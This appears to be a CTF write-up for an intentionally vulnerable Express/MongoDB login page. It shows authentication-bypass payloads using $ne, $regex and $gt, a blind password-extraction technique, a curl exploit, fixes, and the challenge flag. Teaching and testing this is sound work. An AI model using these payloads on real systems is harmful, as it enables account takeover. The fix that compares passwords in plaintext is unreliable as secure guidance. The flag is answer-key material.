# MongoDB NoSQL Injection CTF Challenge

## Challenge Overview
**Name:** SecureAuth - Enterprise Authentication Platform  
**Category:** Web Security  
**Difficulty:** Hard  
**Vulnerability:** Advanced MongoDB NoSQL Injection

---

## Vulnerability Analysis

### Location
The vulnerability exists in **`routes/auth.js`** at the login endpoint (POST `/login`).

### The Flaw
```javascript
const query = {
    username: username,
    password: password
};

const user = await User.findOne(query);
```

The application directly uses user-supplied input (`username` and `password`) from `req.body` to construct a MongoDB query. While this appears safe with simple string inputs, **Express's body-parser automatically parses JSON objects**, allowing attackers to inject MongoDB query operators.

### Why It's Vulnerable

1. **No Input Validation**: The application doesn't validate that `username` and `password` are strings.

2. **Object Injection**: When Content-Type is `application/json`, an attacker can send:
   ```json
   {
     "username": "admin",
     "password": { "$ne": null }
   }
   ```

3. **Query Operator Injection**: This transforms the MongoDB query into:
   ```javascript
   User.findOne({
     username: "admin",
     password: { $ne: null }
   })
   ```
   Which translates to: "Find a user where username is 'admin' AND password is not null" - bypassing authentication entirely.

---

## Exploitation Methods

### Method 1: Basic $ne Operator
**Payload:**
```json
POST /login
Content-Type: application/json

{
  "username": "admin",
  "password": { "$ne": null }
}
```

**Result:** Logs in as admin without knowing the password.

### Method 2: $regex Operator (More Advanced)
**Payload:**
```json
{
  "username": "admin",
  "password": { "$regex": ".*" }
}
```

**Result:** Matches any password using regex.

### Method 3: $gt Operator
**Payload:**
```json
{
  "username": "admin",
  "password": { "$gt": "" }
}
```

**Result:** Matches any password greater than empty string.

### Method 4: Blind NoSQL Injection (Character-by-Character)
Extract password using regex:
```json
{
  "username": "admin",
  "password": { "$regex": "^S" }
}
```

If successful, try `^Su`, then `^Sup`, etc., to extract the full password.

---

## Attack Flow

1. **Register a normal account** to understand the application flow
2. **Intercept the login request** using Burp Suite or similar
3. **Change Content-Type** to `application/json`
4. **Modify the password field** to include a MongoDB operator:
   ```json
   {
     "username": "admin",
     "password": { "$ne": null }
   }
   ```
5. **Submit the request** - you'll be logged in as admin
6. **Access `/admin`** to retrieve the flag

---

## Why This Is Insecure

### Root Causes:
1. **Trusting User Input**: The application assumes `req.body.password` is always a string
2. **No Type Checking**: No validation that inputs are primitive types
3. **Direct Query Construction**: User input is directly merged into database queries
4. **Automatic JSON Parsing**: Express parses complex objects from JSON bodies

### Impact:
- **Authentication Bypass**: Attackers can log in as any user without credentials
- **Privilege Escalation**: Normal users can become administrators
- **Data Exfiltration**: Blind injection can extract sensitive data

---

## How to Fix

### Solution 1: Type Validation
```javascript
if (typeof username !== 'string' || typeof password !== 'string') {
    return res.render('login', { error: 'Invalid input' });
}
```

### Solution 2: Use Mongoose Schema Validation
```javascript
const loginSchema = new mongoose.Schema({
    username: { type: String, required: true },
    password: { type: String, required: true }
}, { strict: true });
```

### Solution 3: Sanitize Input
```javascript
const mongoSanitize = require('express-mongo-sanitize');
app.use(mongoSanitize());
```

### Solution 4: Use Separate Authentication Logic
```javascript
const user = await User.findOne({ username: username });
if (!user || user.password !== password) {
    return res.render('login', { error: 'Invalid credentials' });
}
```

---

## Testing Instructions

### Prerequisites:
- MongoDB running on localhost:27017
- Node.js installed

### Setup:
```bash
npm install
npm start
```

### Exploit:
Use curl or Burp Suite:
```bash
curl -X POST http://localhost:3000/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$ne":null}}'
```

Or use Burp Suite to intercept and modify the login request.

---

## Flag
Successfully exploiting this vulnerability and accessing `/admin` will reveal:
```
CTF{advanced_nosql_injection_admin_bypass}
```

---

## Educational Notes

This challenge demonstrates:
- How NoSQL databases can be vulnerable to injection attacks
- The importance of input validation and type checking
- Why trusting client-side data is dangerous
- How authentication mechanisms can be bypassed through query manipulation

**Remember:** This is an intentionally vulnerable application for educational purposes. Never deploy this code in production!
